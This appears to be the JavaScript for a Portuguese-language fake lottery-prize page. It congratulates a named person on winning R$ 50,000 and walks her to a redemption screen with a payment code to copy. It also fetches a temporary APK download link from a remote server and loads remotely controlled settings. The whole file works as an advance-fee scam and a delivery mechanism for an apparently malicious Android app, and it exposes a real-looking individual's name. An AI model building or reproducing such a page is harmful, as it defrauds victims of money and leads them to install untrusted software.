const WORKER_BASE='https://download.centraldepremios.online';
const API_URL=WORKER_BASE+'/config';
const APK_LINK_URL=WORKER_BASE+'/api/v1/generate-token';

const defaults={
  downloadEnabled:'false',
  customerName:'VERA LÚCIA APARECIDA GNANI',
  campaignName:'Familhão da Lotérica',
  message:'Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.',
  prizeValue:'R$ 50.000,00',
  paymentMethod:'acesso',
  paymentCode:'',
  redemptionText:'Sua participação foi essencial e é com enorme satisfação que anunciamos que você foi contemplado com essa premiação especial.',
  companyName:'Empresa responsável',
  regulationUrl:'#',
  termsUrl:'#'
};

let settings={...defaults};

function setText(id,value){
  const el=document.getElementById(id);
  if(el) el.textContent=value||'';
}

function render(){
  const s=settings;
  const downloadButton=document.getElementById('apkDownloadButton');
  if(downloadButton){
    const enabled=String(s.downloadEnabled)==='true';
    downloadButton.disabled=!enabled;
    downloadButton.textContent=enabled?'Baixar aplicativo':'Download temporariamente indisponível';
  }
  setText('customerName',(s.customerName||defaults.customerName).toUpperCase());
  setText('campaignName',s.campaignName||defaults.campaignName);
  setText('message',s.message||defaults.message);
  setText('prizeValue',s.prizeValue||defaults.prizeValue);
  setText('redeemCustomerName',(s.customerName||defaults.customerName).toUpperCase());
  setText('redeemCampaignName',s.campaignName||defaults.campaignName);
  setText('redeemText',s.redemptionText||s.message||defaults.redemptionText);
  setText('redeemPrizeValue',s.prizeValue||defaults.prizeValue);
  setText('paymentMethodLabel',s.paymentMethod==='boleto'?'Boleto':'Guia de liberação de acesso');
  setText('paymentCodeDisplay',s.paymentCode||'Código não configurado');
  setText('companyName',s.companyName||defaults.companyName);

  const regulation=document.getElementById('regulationLink');
  if(regulation) regulation.href=s.regulationUrl||'#';
  const terms=document.getElementById('termsLink');
  if(terms) terms.href=s.termsUrl||'#';
}

async function loadGlobalConfig(){
  const response=await fetch(API_URL+'?t='+Date.now(),{
    method:'GET',
    cache:'no-store',
    headers:{'Accept':'application/json'}
  });

  if(!response.ok){
    const detail=await response.text().catch(()=> '');
    throw new Error('HTTP '+response.status+' '+detail);
  }

  const remote=await response.json();
  settings={...defaults,...remote};
  render();
}

function showRedemption(){
  document.getElementById('winnerView').hidden=true;
  document.getElementById('redemptionView').hidden=false;
  render();
  window.scrollTo({top:0,behavior:'smooth'});
}

function showWinner(){
  document.getElementById('redemptionView').hidden=true;
  document.getElementById('winnerView').hidden=false;
  render();
  window.scrollTo({top:0,behavior:'smooth'});
}

async function copyCode(){
  const code=(settings.paymentCode||'').trim();
  const feedback=document.getElementById('copyFeedback');
  if(!code){
    feedback.textContent='Nenhuma guia foi configurada no painel.';
    return;
  }
  try{
    await navigator.clipboard.writeText(code);
  }catch{
    const ta=document.createElement('textarea');
    ta.value=code;
    ta.style.position='fixed';
    ta.style.opacity='0';
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    ta.remove();
  }
  feedback.textContent='Guia copiada.';
  setTimeout(()=>feedback.textContent='',1800);
}

function launchConfetti(){
  const layer=document.getElementById('confettiLayer');
  if(!layer) return;
  const motion=window.matchMedia('(prefers-reduced-motion: reduce)');
  if(motion.matches){layer.remove();return}
  const colors=['#c61fb0','#7a2cff','#ff8a4c','#ffcf3f','#1ec8a5'];
  const fragment=document.createDocumentFragment();

  for(let i=0;i<120;i++){
    const piece=document.createElement('i');
    piece.className='confetti-piece';
    piece.style.left=(Math.random()*100)+'%';
    piece.style.setProperty('--c',colors[Math.floor(Math.random()*colors.length)]);
    piece.style.setProperty('--r',(Math.random()*360)+'deg');
    piece.style.setProperty('--spin',(540+Math.random()*540)+'deg');
    piece.style.setProperty('--drift',((Math.random()*220)-110)+'px');
    piece.style.animationDelay=(Math.random()*.3)+'s';
    piece.style.animationDuration=(4+Math.random()*.7)+'s';
    piece.style.width=(6+Math.random()*8)+'px';
    piece.style.height=(10+Math.random()*12)+'px';
    fragment.appendChild(piece);
  }

  layer.appendChild(fragment);
  setTimeout(()=>layer.remove(),5100);
}

document.getElementById('ctaButton')?.addEventListener('click',showRedemption);
document.getElementById('backButton')?.addEventListener('click',showWinner);
document.getElementById('copyPaymentCode')?.addEventListener('click',copyCode);

async function requestTemporaryApkLink(){
  const response=await fetch(APK_LINK_URL+'?t='+Date.now(),{
    method:'POST',
    cache:'no-store',
    credentials:'include',
    headers:{'Accept':'application/json'}
  });

  if(!response.ok){
    const detail=await response.text().catch(()=> '');
    throw new Error('HTTP '+response.status+' '+detail);
  }

  const data=await response.json();
  if(!data.url) throw new Error('LINK_MISSING');
  return data.url;
}

async function downloadApk(){
  const button=document.getElementById('apkDownloadButton');
  if(!button || button.disabled) return;

  const original=button.textContent;
  button.disabled=true;
  button.textContent='Preparando download...';

  try{
    const url=await requestTemporaryApkLink();
    window.location.assign(url);
  }catch(error){
    console.error('Falha ao gerar link temporário:',error);
    button.textContent='Download indisponível';
    setTimeout(()=>button.textContent=original,2200);
  }finally{
    button.disabled=false;
  }
}

document.getElementById('apkDownloadButton')?.addEventListener('click',downloadApk);

render();
launchConfetti();
loadGlobalConfig().catch(error=>{
  console.error('Falha ao carregar configuração online:',error);
});

window.addEventListener('focus',loadGlobalConfig);
document.addEventListener('visibilitychange',()=>{
  if(document.visibilityState==='visible'){ loadGlobalConfig(); }
});
